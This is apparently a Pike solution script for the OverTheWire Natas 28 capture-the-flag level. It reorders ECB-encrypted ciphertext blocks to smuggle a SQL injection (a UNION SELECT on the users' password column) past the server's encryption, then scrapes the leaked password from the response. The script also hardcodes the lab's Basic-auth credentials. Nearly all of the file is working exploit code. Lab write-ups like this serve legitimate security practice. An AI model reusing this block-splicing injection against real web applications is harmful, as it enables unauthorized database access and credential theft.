#!/usr/bin/pike

mapping auth_headers = ([
    "Authorization": "Basic bmF0YXMyODpKV3dSNDM4d2tnVHNOS0JiY0pvb3d5eXNkTTgyWWplRg=="
]);

array(string) get_blocks(string query)
{
    array(string) res = ({ });
    Standards.URI url = Standards.URI("http://natas28.natas.labs.overthewire.org/index.php");
    mapping vars = ([
        "query": query,
    ]);
    Protocols.HTTP.Query q = Protocols.HTTP.do_method("GET", url, vars,
                                                        auth_headers);
    string raw_location = q->headers["location"];
    string encrypted;
    sscanf(raw_location, "%*s=%s", encrypted);
    encrypted = Protocols.HTTP.uri_decode(encrypted);
    encrypted = MIME.decode_base64(encrypted);
    Stdio.Buffer b = Stdio.Buffer();
    b->add(encrypted);
    while (string block = b->read(16))
    {
        res += ({ block });
    }
    return res;
}

array(string) get_sql_injection_blocks()
{
    string clear = "c" * 9;
    clear += "' UNION ALL SELECT password FROM users;#";
    array(string) tmp = get_blocks(clear);
    return tmp[3..5];
}

array(string) get_valid_blocks()
{
    string clear = "c" * 10;
    return get_blocks(clear);
}
void got_li_tag(Parser.HTML p, mapping args, string content, mixed ...extra)
{
    werror("%O\n", content);
    exit(0);
}
int main()
{
    array(string) valid_blocks = get_valid_blocks();
    array(string) sql_inj_blocks = get_sql_injection_blocks();

    array(string) f = ({ });
    foreach (valid_blocks; int n; string block)
    {
        f += ({ block });
        if (n == 2)
        {
            // Insert the injected SQL blocks after the 3rd block.
            f += sql_inj_blocks;
        }
    }

    string q = MIME.encode_base64(f * "");
    Standards.URI url = Standards.URI("http://natas28.natas.labs.overthewire.org/search.php");
    mapping vars = ([
        "query": q
    ]);
    string raw_html = Protocols.HTTP.get_url_data(url, vars, auth_headers);
    Parser.HTML parser = Parser.HTML();
    parser->add_container("li", got_li_tag);
    parser->feed(raw_html);
    return -1;
}
